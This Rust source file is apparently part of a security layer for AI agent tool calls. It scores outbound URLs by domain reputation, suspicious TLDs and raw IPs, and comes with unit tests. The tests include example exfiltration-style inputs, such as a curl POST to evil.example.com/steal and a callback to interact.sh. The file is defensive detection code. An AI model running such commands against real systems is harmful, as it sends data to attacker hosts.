// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Reputation-based scoring filter for known-risky patterns.

use crate::filters::{FilterPhase, SecurityFilter};
use crate::types::{FilterResult, Severity, ToolCallContext, ToolCallType};
use regex::Regex;
use std::collections::HashSet;

/// Filter that checks outbound destination reputation for HTTP requests
/// and URLs embedded in shell commands.
///
/// Runs in Phase 3 (Context) because reputation data may evolve with
/// session state and can inform composite scoring alongside other context filters.
///
/// Scoring:
/// - `-1.0` for known-safe domains (reduces composite score)
/// - `+2.0` for suspicious TLDs (.xyz, .top, .tk, etc.)
/// - `+3.0` for raw IP address destinations
/// - `+4.0` for known-malicious domains
pub struct ReputationFilter {
    known_malicious: HashSet<String>,
    known_safe: HashSet<String>,
    suspicious_tlds: HashSet<String>,
    url_regex: Regex,
}

impl ReputationFilter {
    pub fn new(malicious: HashSet<String>, safe: HashSet<String>) -> Self {
        let suspicious_tlds: HashSet<String> = [
            ".xyz", ".top", ".tk", ".ml", ".ga", ".cf", ".gq", ".buzz", ".work", ".click", ".link",
            ".info", ".pw", ".cc", ".su",
        ]
        .iter()
        .map(|s| (*s).to_string())
        .collect();

        // Regex to extract URLs from shell command strings.
        // Matches http:// or https:// followed by a non-whitespace host portion.
        let url_regex =
            Regex::new(r"https?://([^\s/:]+)").expect("reputation URL regex must compile");

        Self {
            known_malicious: malicious,
            known_safe: safe,
            suspicious_tlds,
            url_regex,
        }
    }

    /// Create a filter with empty domain sets.
    ///
    /// Production code should use `ReputationFilter::new()` with domains loaded
    /// from `config/filters/domains.toml`. This method exists for tests and
    /// fallback scenarios where no config file is available.
    pub fn with_defaults() -> Self {
        Self::new(HashSet::new(), HashSet::new())
    }

    /// Extract the domain/host from a URL string.
    fn extract_domain(url: &str) -> Option<String> {
        // Try to find the host portion between :// and the next / or :
        let after_scheme = url
            .strip_prefix("https://")
            .or_else(|| url.strip_prefix("http://"))?;
        let host = after_scheme.split('/').next()?;
        let host = host.split(':').next()?;
        Some(host.to_lowercase())
    }

    /// Check if a string looks like a raw IPv4 address.
    fn is_raw_ip(host: &str) -> bool {
        host.split('.').count() == 4 && host.split('.').all(|part| part.parse::<u8>().is_ok())
    }

    /// Score a single domain/host.
    fn score_domain(&self, domain: &str) -> (f64, &str, Severity, String) {
        // Check known malicious first (highest priority).
        if self.known_malicious.contains(domain) {
            return (
                4.0,
                "known-malicious",
                Severity::Critical,
                format!("Known malicious domain: {domain}"),
            );
        }

        // Check raw IP addresses.
        if Self::is_raw_ip(domain) {
            return (
                3.0,
                "raw-ip-destination",
                Severity::Warning,
                format!("Raw IP address destination: {domain}"),
            );
        }

        // Check suspicious TLDs.
        for tld in &self.suspicious_tlds {
            if domain.ends_with(tld.as_str()) {
                return (
                    2.0,
                    "suspicious-tld",
                    Severity::Warning,
                    format!("Suspicious TLD in domain: {domain}"),
                );
            }
        }

        // Check known safe domains.
        if self.known_safe.contains(domain) {
            return (
                -1.0,
                "known-safe",
                Severity::Notice,
                format!("Known safe domain: {domain}"),
            );
        }

        // Unknown domain: neutral score.
        (0.0, "", Severity::Notice, String::new())
    }

    /// Extract URLs from a shell command string and return all domains found.
    fn extract_domains_from_command(&self, command: &str) -> Vec<String> {
        self.url_regex
            .captures_iter(command)
            .filter_map(|cap| cap.get(1).map(|m| m.as_str().to_lowercase()))
            .collect()
    }
}

#[async_trait::async_trait]
impl SecurityFilter for ReputationFilter {
    fn name(&self) -> &str {
        "reputation"
    }

    fn phase(&self) -> FilterPhase {
        FilterPhase::Context
    }

    async fn evaluate(&self, ctx: &ToolCallContext) -> crate::error::Result<FilterResult> {
        let domains: Vec<String> = match &ctx.call_type {
            ToolCallType::HttpRequest { url, .. } => {
                Self::extract_domain(url).into_iter().collect()
            }
            ToolCallType::ShellExec { .. } | ToolCallType::ProcessSpawn { .. } => {
                match ctx.full_command() {
                    Some(full) => self.extract_domains_from_command(&full),
                    None => return Ok(FilterResult::no_match("reputation")),
                }
            }
            ToolCallType::NetConnect { address, .. } => {
                vec![address.to_lowercase()]
            }
            _ => return Ok(FilterResult::no_match("reputation")),
        };

        if domains.is_empty() {
            return Ok(FilterResult::no_match("reputation"));
        }

        // Find the highest-scoring (worst reputation) domain.
        let mut best_score = 0.0_f64;
        let mut best_rule = "";
        let mut best_severity = Severity::Notice;
        let mut best_message = String::new();
        let mut has_match = false;

        for domain in &domains {
            let (score, rule, severity, message) = self.score_domain(domain);
            // A score of 0.0 with empty rule means unknown - not a real match.
            if !rule.is_empty() && score > best_score {
                best_score = score;
                best_rule = rule;
                best_severity = severity;
                best_message = message;
                has_match = true;
            } else if !rule.is_empty() && !has_match {
                // First match (could be negative score for known-safe).
                best_score = score;
                best_rule = rule;
                best_severity = severity;
                best_message = message;
                has_match = true;
            }
        }

        if has_match {
            Ok(FilterResult::matched(
                "reputation",
                best_rule,
                best_score,
                best_severity,
                best_message,
            ))
        } else {
            Ok(FilterResult::no_match("reputation"))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::ToolCallType;
    use uuid::Uuid;

    fn make_ctx(call_type: ToolCallType) -> ToolCallContext {
        ToolCallContext::new("test", call_type, Uuid::new_v4())
    }

    fn filter_with_malicious() -> ReputationFilter {
        let mut malicious = HashSet::new();
        malicious.insert("evil.example.com".to_string());
        malicious.insert("malware.bad".to_string());

        let safe: HashSet<String> = ["github.com", "npmjs.com"]
            .iter()
            .map(|s| (*s).to_string())
            .collect();

        ReputationFilter::new(malicious, safe)
    }

    #[tokio::test]
    async fn test_known_safe_domain_negative_score() {
        let filter = filter_with_malicious();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://github.com/user/repo".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, -1.0);
        assert_eq!(result.rule_id, "known-safe");
    }

    #[tokio::test]
    async fn test_known_malicious_domain() {
        let filter = filter_with_malicious();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.example.com/exfil".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, 4.0);
        assert_eq!(result.rule_id, "known-malicious");
        assert_eq!(result.severity, Severity::Critical);
    }

    #[tokio::test]
    async fn test_suspicious_tld() {
        let filter = filter_with_malicious();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://download-free.xyz/payload".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, 2.0);
        assert_eq!(result.rule_id, "suspicious-tld");
    }

    #[tokio::test]
    async fn test_raw_ip_address() {
        let filter = filter_with_malicious();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "http://192.168.1.100:8080/data".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, 3.0);
        assert_eq!(result.rule_id, "raw-ip-destination");
    }

    #[tokio::test]
    async fn test_unknown_domain_no_match() {
        let filter = filter_with_malicious();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://some-random-site.com/page".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(!result.matched);
        assert_eq!(result.score, 0.0);
    }

    #[tokio::test]
    async fn test_shell_command_with_url() {
        let filter = filter_with_malicious();
        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "curl".into(),
            args: vec![
                "-X".into(),
                "POST".into(),
                "https://evil.example.com/steal".into(),
            ],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, 4.0);
        assert_eq!(result.rule_id, "known-malicious");
    }

    #[tokio::test]
    async fn test_file_read_returns_no_match() {
        let filter = filter_with_malicious();
        let ctx = make_ctx(ToolCallType::FileRead {
            path: "/tmp/test.txt".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(!result.matched);
    }

    #[tokio::test]
    async fn test_with_explicit_safe_domains() {
        let safe: HashSet<String> = ["crates.io"].iter().map(|s| (*s).to_string()).collect();
        let filter = ReputationFilter::new(HashSet::new(), safe);
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://crates.io/api/v1/crates".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, -1.0);
        assert_eq!(result.rule_id, "known-safe");
    }

    #[tokio::test]
    async fn test_shell_command_without_url_no_match() {
        let filter = filter_with_malicious();
        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "ls".into(),
            args: vec!["-la".into()],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(!result.matched);
    }

    #[tokio::test]
    async fn test_extract_domain_helper() {
        assert_eq!(
            ReputationFilter::extract_domain("https://github.com/user/repo"),
            Some("github.com".to_string())
        );
        assert_eq!(
            ReputationFilter::extract_domain("http://192.168.1.1:8080/path"),
            Some("192.168.1.1".to_string())
        );
        assert_eq!(ReputationFilter::extract_domain("ftp://bad.com"), None);
    }

    #[tokio::test]
    async fn test_is_raw_ip_helper() {
        assert!(ReputationFilter::is_raw_ip("192.168.1.1"));
        assert!(ReputationFilter::is_raw_ip("10.0.0.1"));
        assert!(!ReputationFilter::is_raw_ip("github.com"));
        assert!(!ReputationFilter::is_raw_ip("256.1.1.1")); // 256 > u8::MAX
        assert!(!ReputationFilter::is_raw_ip("1.2.3")); // only 3 octets
    }

    #[tokio::test]
    async fn test_with_explicit_malicious_domains() {
        let malicious: HashSet<String> = ["interact.sh"].iter().map(|s| (*s).to_string()).collect();
        let filter = ReputationFilter::new(malicious, HashSet::new());
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://interact.sh/callback".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.score, 4.0);
        assert_eq!(result.rule_id, "known-malicious");
    }

    #[tokio::test]
    async fn test_with_defaults_is_empty() {
        let filter = ReputationFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://webhook.site/some-uuid".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        // with_defaults() has no domains, so nothing matches
        assert!(!result.matched);
    }
}
